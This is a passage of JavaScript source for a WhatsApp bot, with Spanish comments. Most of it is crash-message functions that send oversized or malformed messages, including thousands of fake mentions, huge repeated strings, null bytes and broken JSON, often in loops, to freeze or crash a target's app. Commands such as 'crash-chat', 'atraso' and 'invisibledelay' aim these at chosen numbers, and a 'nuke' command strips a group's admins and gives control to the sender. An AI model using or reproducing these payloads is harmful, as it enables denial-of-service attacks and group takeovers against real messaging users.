              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1073741824000000",
              pageCount: 9007199254740991 * 9999,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "💣⃟ㄗ𖦪𖤬ꛈ𖣠ꘘꘘꛈꛕꛈ𖤬ꚳ 𖤗 𖢧ꛉꚲཀ͜͡🪅-‣" + "꧀".repeat(1000),
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "꧀".repeat(60000)
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: target,
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              "13135550002@s.whatsapp.net",
              ...Array.from(
              { length: 1990 },
              () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
                ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 999999999999999999999999999999999999999999999999999999999e99999999999
              }
            },
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\0" + "💣⃟ㄗ𖦪𖤬ꛈ𖣠ꘘꘘꛈꛕꛈ𖤬ꚳ 𖤗 𖢧ꛉꚲཀ͜͡🪅-‣" + "꧀".repeat(9999),
                  "flow_message_version": "3"
                })
              },
            ]
          }
        }
      }
    },
    participant: { jid: target }
  };

  const PraiXMessage = generateWAMessageFromContent(
    target,
    proto.Message.fromObject(PraiX),
    {
      userJid: target
    }
  );
  await conn.relayMessage(
    target,
    PraiXMessage.message,
    {
      messageId: PraiXMessage.key.id
    }
  );
}
async function blenklet(conn, target) {
    let crash = JSON.stringify({ action: "x", data: "x" });

    while (true) {
        try {
            await conn.relayMessage(target, {
                stickerPackMessage: {
                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                    name: "chocoplus ¿?" + "ꦾ".repeat(77777),
                    publisher: "t.me/kkkkkkk",
                    stickers: [
                        { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, mimetype: "image/webp" }
                    ],
                    fileLength: "3662919",
                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
                    contextInfo: {
                        mentionedJid: [
                            "593969533280@s.whatsapp.net",
                            ...Array.from({ length: 1900 }, () =>
                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                            )
                        ]
                    }
                }
            }, {});

            const msg = generateWAMessageFromContent(target, {
                viewOnceMessageV2: {
                    message: {
                        listResponseMessage: {
                            title: "xGhr.mp5 ¿?",
                            listType: 4,
                            buttonText: { displayText: "xGhr.mp5¿?" },
                            singleSelectReply: { selectedRowId: "⌜⌟" },
                            contextInfo: {
                                mentionedJid: [target],
                                externalAdReply: {
                                    title: "xGhr.mp5 ¿?",
                                    body: "xGhr.mp5 ¿?",
                                    mediaType: 1,
                                    nativeFlowButtons: [
                                        { name: "payment_info", buttonParamsJson: crash },
                                        { name: "call_permission_request", buttonParamsJson: crash }
                                    ]
                                },
                                extendedTextMessage: {
                                    text: "ꦾ".repeat(20000) + "@1".repeat(20000)
                                }
                            }
                        }
                    }
                }
            }, {});

            await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
        } catch (err) {
        }

        await new Promise(r => setTimeout(r, 500));
    }
}
async function blankDelayMp3(conn, target, mention = false) {
    console.log(chalk.blue(`Succes Sending Bug To Target ${target} | Mention: ${mention}`));

    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1950 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    // payload de audio
    const audioMessagePayload = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
                        226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0,
                        44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245,
                        153, 93, 211
                    ]),
                    fileLength: 432722,
                    seconds: 20,
                    ptt: false,
                    mediaKey: Buffer.from([
                        182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98,
                        117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212,
                        145
                    ]),
                    fileEncSha256: Buffer.from([
                        29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84,
                        131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211,
                        83, 153
                    ]),
                    directPath:
                        "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: mentionedList,
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msgAudio = generateWAMessageFromContent(target, audioMessagePayload, {});

    // relay al estado con meta extra
    await conn.relayMessage("status@broadcast", msgAudio.message, {
        messageId: msgAudio.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target } }]
                    }
                ]
            }
        ]
    });

    console.log(chalk.green(`blankDelayMp3 Completed for ${target}`));
}
async function InvisibleStc(conn, target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await conn.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(`─────「 ⏤!InvisibleSticker To: ${target}!⏤ 」─────`)
}
async function msgdelay(conn, target) {
  const parse = false;

  const generateMentionList = () => [
    "0@s.whatsapp.net",
    ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
  ];

  const msg = await generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "This is Team",
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: "DARI DIA UNTUK KAMU🥰",
          body: "Maaf ya gantenk kena bak",
          thumbnailUrl: "https://telegra.ph/file/10c20b56e84743cfd77b2.jpg",
          mediaType: 1,
          sourceUrl: "https://t.me/noxxasoloo",
          showAdAttribution: true
        }
      }
    },

    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: 'bokep.com',
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/516029272_1071726418353084_4180437093282650193_n.enc?ccb=11-4&oh=01_Q5Aa1wHAUfudGsmO-8hby7Gx7zhnbkKERzehZH2OXihcymBiiw&oe=688DC401&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/zip",
              fileSha256: "BTgVKu2NWPC/ssevWMLNvP1mwJ0tZa3nA+8UahrO7Pk=",
              fileLength: "10680811",
              pageCount: 0,
              mediaKey: "kg7lL4wDCx9XLQ5hdTsuUIP8Xa/hQ4MkF2AWAjJTLEI=",
              fileName: "Base RexzTyz.zip",
              fileEncSha256: "FwxDXQpgaGJX4+JOxqQNZsVSuj2Kwd86JM8NWt1Ho8I=",
              directPath: "/v/t62.7119-24/516029272_1071726418353084_4180437093282650193_n.enc?ccb=11-4&oh=01_Q5Aa1wHAUfudGsmO-8hby7Gx7zhnbkKERzehZH2OXihcymBiiw&oe=688DC401&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1751539667"
            }
          },
          body: {
            text: 'Cool in for me'
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 100 }, () =>
                `1${Math.floor(Math.random() * 50000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    },

    stickerBase: {
      url: `https://mmg.whatsapp.net/v/t62.43144-24/${choco}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid==true`,
      fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
      fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
      mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
      mimetype: "type",
      directPath: `/v/t62.43144-24/?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=`,
      fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
      mediaKeyTimestamp: { low: Date.now() % 2147483647, high: 0, unsigned: false },
      firstFrameLength: 19904,
      firstFrameSidecar: "KN4kQ5pyABRAgA==",
      isAnimated: true,
      isAvatar: parse,
      isAiSticker: parse,
      isLottie: parse,
      contextInfo: {
        participant: target,
        mentionedJid: generateMentionList(),
        groupMentions: [],
        entryPointConversionSource: "non_contact",
        entryPointConversionApp: "whatsapp",
        entryPointConversionDelaySeconds: 467593
      },
      stickerSentTs: { low: Math.floor(Math.random() * -20000000), high: 555, unsigned: parse }
    },

    hellboyHeader: {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Pelerrr",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "msgdelay",
                address: "msgdelay!"
              }
            },
            body: { text: "" },
            nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"]
            }
          }
        }
      }
    },

    cardTemplate: {
      header: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
          fileLength: { low: 4194304, high: 2560, unsigned: true },
          seconds: 999999999,
          mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
          height: 9999,
          width: 9999,
          fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
          directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1751081957",
          jpegThumbnail: "",
          streamingSidecar: null
        },
        hasMediaAttachment: false
      },
      body: {
        text: "woits -_-"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: ""
          },
          {
            name: "call_permission_request",
            buttonParamsJson: JSON.stringify({})
          }
        ],
        messageParamJson: "{{".repeat(10000)
      }
    },

    locationMessage: {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000".repeat(5000) + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000".repeat(5000) + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
      url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`
    },

    interactiveMessage: {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: "‼️⃟GlX-Team" + "ោ៝".repeat(50000),
      title: "☆",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
      artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
      artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
      artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
      countryBlocklist: true,
      isExplicit: true,
      artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    }

  }, {});

  await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
}
async function yangBacaDev(target, ptcp) {
    let msg = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            contextInfo: {
                mentionedJid: Array.from(
                    { length:2000 },
                    (_, z) => `1313555020${z + 1}@s.whatsapp.net`
                ),
                isForwarded: true,
                forwardingScore: 2085,
                forwardedAiBotMessageInfo: {
                    botJid: "13135550202@bot",
                    botName: "Business Assistant",
                    creator: "7eppeli"
                },
                participant: "13135550202@bot",
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: "UPI",
                        expiryTimestamp: Date.now()
                    }
                },
                remoteJid: "FineShyt"
            },
            body: {
                text: "7-Yuukey",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"body\":\"7-Yuukey\",\"title\":\"7eppeli=Explorations\",\"title\":\"FVCK URSELF\"}"
            }
        }
    }, { userJid:target });

    await conn.relayMessage(target, msg.message, ptcp ? {
        participant: { jid:target },
        messageId: msg.key.id
    } : {
        messageId: msg.key.id
    })
}
async function yangBacaDev2(conn, jid, ptcp) {
    let msg = generateWAMessageFromContent(jid, {
        interactiveResponseMessage: {
            contextInfo: {
                mentionedJid: Array.from(
                    { length: 2000 },
                    (_, z) => `1313555020${z + 1}@s.whatsapp.net`
                ),
                isForwarded: true,
                forwardingScore: 2085,
                forwardedAiBotMessageInfo: {
                    botJid: "13135550202@bot",
                    botName: "Business Assistant",
                    creator: "7eppeli"
                },
                participant: "13135550202@bot",
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: "UPI",
                        expiryTimestamp: Date.now()
                    }
                },
                remoteJid: "FineShyt"
            },
            body: {
                text: "¿𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘?",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"body\":\"7-Yuukey\",\"title\":\"7eppeli=Explorations\",\"title\":\"FVCK URSELF\"}"
            }
        }
    }, { userJid: jid });

    await conn.relayMessage(jid, msg.message, ptcp ? {
        participant: { jid },
        messageId: msg.key.id
    } : {
        messageId: msg.key.id
    });
}
switch(command) {
// Dentro de tu switch de comandos
case 'atraso':
  if (!isBot && !isCreator) return

  // Reacción inicial
  await conn.sendMessage(m.chat, { react: { text: '⏳️', key: m.key } })

  const imagePath = "./media/foto.jpg"
  const groupLink = "kkkkkk"
  const bodyText = "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"

  // Función para crear un card
  async function createCard(i) {
    return {
      header: proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia({ image: { url: imagePath } }, { upload: conn.waUploadToServer })),
        title: `\n${groupLink}\n #${i}`,
        gifPlayback: true,
        subtitle: " ",
        hasMediaAttachment: false
      }),
      body: { text: bodyText + " ⚡" + i },
      nativeFlowMessage: {
        buttons: [{
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "bay bay ",
            url: groupLink,
            merchant_url: groupLink
          })
        }]
      }
    }
  }

  // Generar cientos de cards (ej: 200)
  const cards = []
  for (let i = 0; i < 200; i++) {
    cards.push(await createCard(i))
  }

  // Mandar el payload muchas veces
  for (let i = 0; i < 80; i++) {
    await conn.relayMessage(from, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: bodyText + "\0".repeat(0x99999) }, // muchísimo más grande
            carouselMessage: { cards }
          }
        }
      }
    }, { participant: { jid: from } })
  }

  // Reacción final
  await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
  break
case "statusbox": {
  try {
    await handleStatusBox(conn, m); 
  } catch (e) {
    console.error(e);
    await conn.sendMessage(m.chat, { text: `❌ Error: ${e.message}` }, { quoted: m });
  }
  break;
}
case 'button':
if (!isBot && !isCreator) return
if (m.isGroup && groupid.includes(m.chat)) {
    return reply("❎❎❎❎");
}
await conn.sendMessage(from, {
image: { url: './src/foto.jpg' },
"contextInfo": {
  "externalAdReply": {
    "title": `𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`,
    "body": 'ola',
    "mediaType": 4,
    "thumbnail": web,
"jpegThumbnail": web,
    "MediaUrl": 'https://youtube.com/@p.a.zinwebkkkkj',
    "sourceUrl": 'https://whatsapp.com/channel/0029VaorTv7AzNbwdT52Rj2C'
  }
},
caption: `☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️`,
footer: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥`,
buttons: [
  { buttonId: 'sekzo', buttonText: { displayText: sekzo3 }, type: 10 },
  { buttonId: 'sekzo2', buttonText: { displayText: sekzo3}, type: 10 },
  { buttonId: 'sekzo34', buttonText: { displayText: sekzo3 }, type: 10 },
  { buttonId: 'sekzo4', buttonText: { displayText: sekzo3 }, type: 10 },
],
headerType: 1,
viewOnce: true
});
break; 
case "atraso-package": {
    if (!isBot && !isCreator) return;

    let pelaku = m.mentionedJid && m.mentionedJid.length > 0
        ? m.mentionedJid[0]
        : m.quoted
            ? m.quoted.sender
            : (q ? q.replace(/[^0-9]/g, '') : null);

    if (!pelaku) return reply(" Ingresa un número válido.");

    let target = pelaku.includes('@s.whatsapp.net') ? pelaku : pelaku + "@s.whatsapp.net";
    let xgr = 5;  
    for (let i = 0; i < xgr; i++) {
        blenklet(conn, target)
    }

    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
}
break;
case 'invisibledelay':
if (!isBot && !isCreator) return
conn.sendMessage(m.chat, {react: {text: '⏳️', key: m.key}})
for (let i = 0; i < 20; i++) {
  let msg = await generateWAMessageFromContent(from, {
buttonsMessage: {
text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
contentText: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏",
buttons: [
{
buttonId: ".null",
buttonText: {
displayText: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" + "\u0000".repeat(500000),
},
type: 1,
},
],
headerType: 1,
},
}, {});
await conn.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [from],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: from },
content: undefined,
},
],
},
],
},
],
});
if (isCreator) {
await conn.relayMessage( from,
{
groupStatusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25,
},
},
},
},
{
additionalNodes: [
{
tag: "meta",
attrs: {
is_status_mention: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
},
content: undefined,
},
],
}
);
}
}
conn.sendMessage(m.chat, {react: {text: '✅️', key: m.key}})
break
case "atraso-sticker": {
    if (!isBot) return 

    let target = m.mentionedJid && m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : q 
            ? q.replace(/[^0-9]/g, '') + "@s.whatsapp.net" 
            : m.sender; 
for (let i = 0; i < 30; i++) {
    await InvisibleStc(conn, from)
    
    
    }
}
break;

case "crash-chat": {
    if (!isBot && !isCreator) return;
  for (let i = 0; i < 3; i++) {
    yangBacaDev2(conn, from)
    await sleep(8000)
    yangBacaDev2(conn, from)
    await sleep(8000)
    yangBacaDev2(conn, from)
    await sleep(8000)
    yangBacaDev2(conn, from)
    await sleep(8000)
    yangBacaDev2(conn, from)
    
    }
    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
    
}
break;
case 'ig': {
    if (!q) return reply('Ingresa el enlace de Instagram');
    try {
        const apiUrl = `https://api.nexfuture.com.br/api/downloads/instagram/dl?url=${encodeURIComponent(q)}`;
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`Error en la API: ${response.status}`);
        const json = await response.json();

        if (!json.status || !json.resultado || !json.resultado.data) {
            return reply('❌ No se pudo descargar el video');
        }

        // Recorremos los resultados (pueden ser varios)
        for (let item of json.resultado.data) {
            const { url, thumbnail } = item;
            await conn.sendMessage(from, { 
                video: { url }, 
                caption: `✅ Aquí está tu video de Instagram`,
                jpegThumbnail: thumbnail ? await (await fetch(thumbnail)).buffer() : null
            }, { quoted: m });
        }
    } catch (err) {
        console.error(err);
        reply('Error');
    }
}
break;
case 'play': {
    if (!q) return reply('`Ingresa el nombre de la canción`');
    try {
        const apiUrl = `https://api.nexfuture.com.br/api/downloads/youtube/play?query=${encodeURIComponent(q)}`;
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`Error en la API: ${response.status}`);
        const ñiñi = await response.json();
        if (!ñiñi.status || !ñiñi.resultado) return reply('No se encontraron resultados');
        const { imagem, titulo, desc, tempo, views, audio } = ñiñi.resultado;
        const caption = `> *Título:* ${titulo}\n> *Duración:* ${tempo}\n> *Vistas:* ${views}\n> *Descripción:* ${desc}\n\n\`_Enviando audio..._\``;
        await conn.sendMessage(from, { 
            image: { url: imagem }, 
            caption 
        }, { quoted: m });
        const mp3 = path.join(__dirname, `./tempo/${titulo}_${Date.now()}.mp3`);
        const opus = path.join(__dirname, `./tempo/${titulo}_${Date.now()}.opus`);
        const audio2 = await fetch(audio).then(res => res.buffer());
        fs.writeFileSync(mp3, audio2);
        const { execSync } = require('child_process');
        execSync(`ffmpeg -i "${mp3}" -vn -c:a libopus -b:a 128k "${opus}"`);
        await conn.sendMessage(from, { 
            audio: fs.readFileSync(opus), 
            mimetype: 'audio/ogg; codecs=opus', 
            ptt: false
        }, { quoted: m });
        setTimeout(() => {
            if (fs.existsSync(mp3)) fs.unlinkSync(mp3);
            if (fs.existsSync(opus)) fs.unlinkSync(opus);
        }, 2 * 60 * 1000);

    } catch (err) {
        console.error(err);
        reply(`Error`);
    }
}
break;
case 'idgroup': {
  try {
    const groups = await conn.groupFetchAllParticipating();
    const groupJids = Object.keys(groups);

    const jidDestino = m.chat || m.key?.remoteJid;

    if (groupJids.length === 0) {
      await conn.sendMessage(jidDestino, { text: '❌' }, { quoted: choco });
      break;
    }

    // Listamos Nombre + ID
    let lines = [];
    groupJids.forEach((jid, i) => {
      const subject = groups[jid]?.subject || "Grupo sin nombre";
      lines.push(`${i + 1}. \`${subject}\` — ${jid}`);
    });

    const text = ` *ID (${lines.length}):*\n\n` + lines.join('\n');

    if (text.length > 2000) {
      const buffer = Buffer.from(text, 'utf-8');
      await conn.sendMessage(jidDestino, {
        document: buffer,
        fileName: 'idgroups.txt',
        mimetype: 'text/plain'
      }, { quoted: choco });
    } else {
      await conn.sendMessage(jidDestino, { text }, { quoted: choco });
    }
  } catch (err) {
    console.error(err);
    const jidDestino = m.chat || m.key?.remoteJid;
    await conn.sendMessage(jidDestino, { text: ' Ocurrió un error al listar los grupos.' }, { quoted: choco });
  }
  break;
}
case 'nuke': {
  // Sólo owner puede us
  if (!isBot) return 
  if (!m.isGroup) return reply('Este comando solo funciona en grupos.');

  try {
    
    const metadata = await conn.groupMetadata(from);
    const parts = metadata.participants || [];
    const admins = parts.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.id);
    if (admins.length === 0) {
      await conn.sendMessage(from, { text: 'Não' }, { quoted: m });
      break;
    }
    for (let adm of admins) {
      if (adm === sender) continue;
      if (adm === botNumber) continue;
      try {
        await conn.groupParticipantsUpdate(from, [adm], 'demote');
        await sleep(300); 
      } catch (e) {
        await conn.sendMessage(from, { text: `⚠️ No pude despromover a ${adm.split('@')[0]}: ${String(e).slice(0,80)}` }, { quoted: m });
      }
    }
    try {
      await conn.groupParticipantsUpdate(from, [sender], 'promote');
    } catch (e) {
  
    }

    await conn.sendMessage(from, { text: '✅' }, { quoted: m });

  } catch (err) {
    console.error(err);
  }
}
  break;



case 'tt':
case 'tiktok': {
    if (!q) return reply('*Ingresa el enlace del video de tiktok');
    try {
